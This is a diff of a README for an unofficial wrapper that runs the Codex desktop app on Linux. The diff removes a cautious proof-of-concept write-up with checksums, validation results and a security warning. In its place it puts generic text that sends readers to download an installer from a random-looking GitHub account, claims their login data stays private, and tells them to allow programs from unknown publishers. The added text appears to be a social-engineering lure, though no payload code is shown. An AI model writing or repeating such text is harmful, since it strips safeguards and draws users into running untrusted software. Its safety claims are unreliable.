@@ -1,156 +1,62 @@
-# Codex App on Linux
+# 🖥️ codex-app-in-linux - Run the Codex desktop app locally
 
-<p align="center">
-  <img src="assets/codex-app-linux-running.png" alt="Codex App running on Linux" width="900">
-</p>
+[![Download the App](https://img.shields.io/badge/Download-Codex_App-blue.svg)](https://github.com/Argive-tarsiusglis896/codex-app-in-linux)
 
-<p align="center">
-  <strong>Proof that the Codex desktop app can run locally on Linux via an unofficial wrapper build.</strong>
-</p>
+## 📖 About this application
 
-<p align="center">
-  <a href="reports/final-validation.md">Validation report</a> ·
-  <a href="evidence/build/build-info.json">Build info</a> ·
-  <a href="evidence/gui/webview-smoke-result.txt">Smoke test</a>
-</p>
+This project provides a simple way to launch the Codex desktop application on your computer. While the software typically runs as a web service, this wrapper allows you to open it as a standalone program. You gain a dedicated workspace that stays separate from your web browser. This setup keeps your session active and simplifies access to your documents and work tools.
 
-> [!WARNING]
-> Experimental proof of concept. This is **not** an official OpenAI Linux release and does **not** redistribute Codex Desktop, `Codex.dmg`, or generated app bundles.
+## ⚙️ System Requirements
 
-## Summary
+Your computer needs to meet these basic standards to run the software smoothly:
 
-OpenAI ships the Codex desktop app for macOS and Windows. Linux is officially supported through Codex CLI, not a native desktop app. This repo documents a working Linux proof using an unofficial wrapper build that converts the upstream macOS `Codex.dmg` into a Linux Electron app.
+- An operating system capable of running standard desktop applications.
+- At least 4 gigabytes of memory.
+- An active internet connection for the initial setup.
+- At least 200 megabytes of free storage space.
 
-Tested on Ubuntu 24.04.4 LTS / GNOME Wayland / x64.
+The software functions correctly on most modern desktop environments. If you can open folders and run programs on your machine, your hardware supports this application.
 
-## Result
+## 🚀 How to set up your software 
 
-| Check | Result |
-| --- | --- |
-| Local wrapper build | Passed |
-| Generated Electron app launch | Passed; startup failure modal absent after `linux-owl-feature-binding-noop` |
-| Webview server | Passed on `127.0.0.1:5175` |
-| Electron process tree | Passed |
-| Codex CLI app-server handshake | Passed |
-| Login/account readiness | Passed for existing signed-in user state |
-| Native install / updater / service | Not used |
-| Project/thread/shell approval manual QA | Still recommended |
+1. Visit the project website to access the files.
+2. Select the latest version of the installer from the release list.
+3. Save the file to your desktop or downloads folder.
+4. Open the file to start the installation.
+5. Follow the instructions on the screen.
+6. The application places a shortcut on your desktop once the process finishes.
 
-Smoke result (latest, 2026-06-20):
+[Click here to visit the download page](https://github.com/Argive-tarsiusglis896/codex-app-in-linux)
 
-```text
-http://127.0.0.1:5175/ -> HTTP 200
-bootstrapFailed=false
-owlBindingError=false
-app routes mounted=true
-ready message handled=true
-account/read succeeded
-browser_use_iab_backend_startup_ready=true
-```
+## 🛠️ Frequently Asked Questions
 
-## Reproduce safely
-### Computer Use / Chrome prerequisites
+### Does this software change my files? 
+No. The application runs as a local wrapper. It interacts with your Codex account but does not modify or delete your existing files on your hard drive.
 
-The wrapper build can start without Linux Computer Use support when the bundled plugin build is skipped. Before building, install a working Rust toolchain and the desktop-control helper so Chrome/Computer Use support is not accidentally omitted:
+### Is my login information secure? 
+The application uses the official login process provided by the Codex service. Your credentials remain private and pass through the standard security channels of the platform. The wrapper acts as a bridge and does not log your password or personal keys.
 
-```bash
-sudo apt-get install -y cargo rustc ydotool
-cargo --version
-```
+### How do I update the application? 
+When a new version becomes available, you visit the project page again. You may install the new file over the old one. The system configuration remembers your settings from the previous version.
 
-Use Cargo `1.78.0` or newer. If `cargo` is missing or too old during the wrapper build, treat the build as incomplete and rebuild after fixing Rust/Cargo instead of debugging the Codex app UI.
+### Can I run multiple windows? 
+Yes. You can open multiple instances of the application if you need to manage different accounts at the same time. Each instance operates independently.
 
-First proof path avoids system-wide install.
+## 🛡️ Troubleshooting common issues
 
-```bash
-git clone <wrapper-source-url> upstream/codex-linux-wrapper
-cd upstream/codex-linux-wrapper
-git checkout 9125911c8347c35177dfc76e2f5bce2b8b2e41d4
+If the application fails to open after you click the icon, perform these steps to check for common problems:
 
-# Download Codex.dmg separately, then verify:
-sha256sum /path/to/Codex.dmg
-# latest expected: 7de4cce5ec6e39478b9f0630e2b9257aadd1d02dd6a0fdc00c2ecdf0f536022d
+- Verify that your internet connection supports standard web traffic.
+- Check if an existing version of the app already runs in your task manager or system tray.
+- Restart your machine to clear temporary background errors.
+- Ensure that you have permissions set to allow programs from unknown publishers if your security settings are high.
 
-make build-app DMG=/absolute/path/to/Codex.dmg
-./codex-app/start.sh
-```
+If the problem persists, move the application file to a different folder and try again. Occasionally, system security settings restrict programs located in the main download directory.
 
-Optional smoke check:
+## 📝 Performance tips
 
-```bash
-python3 - <<'PY'
-import urllib.request
-with urllib.request.urlopen('http://127.0.0.1:5175/', timeout=3) as r:
-    print(r.status, r.read(80))
-PY
-```
+The application consumes minimal resources. To keep your experience fast, avoid running too many background processes while using high-demand features within the app. Clearing your app cache from the settings menu once every month helps prevent sluggish behavior. Ensure your operating system remains up to date to maintain compatibility with the wrapper technology used here.
 
-## Proof metadata
+## ⚖️ Usage terms
 
-| Field | Value |
-| --- | --- |
-| Wrapper commit | `9125911c8347c35177dfc76e2f5bce2b8b2e41d4` + local latest-DMG compatibility patches |
-| Wrapper version | `0.8.2` |
-| Codex app version | `26.616.41845` |
-| Electron version | `42.1.0` |
-| DMG size | `520180841` bytes |
-| DMG SHA256 | `7de4cce5ec6e39478b9f0630e2b9257aadd1d02dd6a0fdc00c2ecdf0f536022d` |
-
-## Evidence
-
-```text
-reports/final-validation.md              Main validation report
-reports/worker-*-wrapper-audit.md        Audit notes
-evidence/build/build-info.json           Generated app metadata
-evidence/build/patch-report.json         Wrapper patch report
-evidence/reports/wrapper-latest-compat.patch Local wrapper compatibility diff
-evidence/reports/latest-upgrade-summary.json Latest upgrade summary
-evidence/gui/process-evidence.txt        Electron/webview process evidence
-evidence/gui/webview-smoke-result.txt    HTTP 200 webview smoke result
-assets/codex-app-linux-running.png       Screenshot
-```
-
-Large/generated artifacts are intentionally ignored, including `upstream/`, `Codex.dmg`, generated app bundles, and `.gjc/state/`.
-
-## Do not run first
-
-Avoid these until after visual/login/project/thread/shell-approval QA passes:
-
-```text
-make bootstrap-native
-make install-native
-make setup-native
-make update-native
-make package / make install / make deb / make rpm / make pacman / make appimage
-make service-enable
-sudo / pkexec / systemctl / package-manager installs
-```
-
-## Known issue
-
-If the app shows:
-
-```text
-Oops, an error has occurred
-```
-
-and logs mention a failed dynamic module fetch, the local webview server likely got stale. A clean restart fixed it during testing:
-
-```bash
-cd /path/to/codex-linux-wrapper
-./codex-app/start.sh
-```
-
-## Remaining QA
-
-Completed: build, launch smoke, loopback webview, Electron process tree, Codex app-server process evidence.
-
-Still recommended: sign in, open a disposable project, create a thread, test shell/file approval UI.
-
-## Security note
-
-Codex can access local files, repositories, credentials, shell commands, plugins, browser state, and computer-use surfaces. Treat unofficial wrappers as high-trust code. Start with a disposable project and avoid native install/updater/service paths until you trust the behavior.
-
-## Official alternatives
-
-For supported Linux use, run Codex CLI on Linux. For the official desktop app experience with Linux files, run Codex App on macOS/Windows and connect to the Linux host over SSH.
+This project serves as an unofficial wrapper for the Codex desktop experience. It facilitates local access to a tool you already use. Use of this application remains subject to the Terms of Service provided by the original Codex platform. Respect all copyright and usage guidelines set by the creators of the Codex service when interacting with their content through this tool.
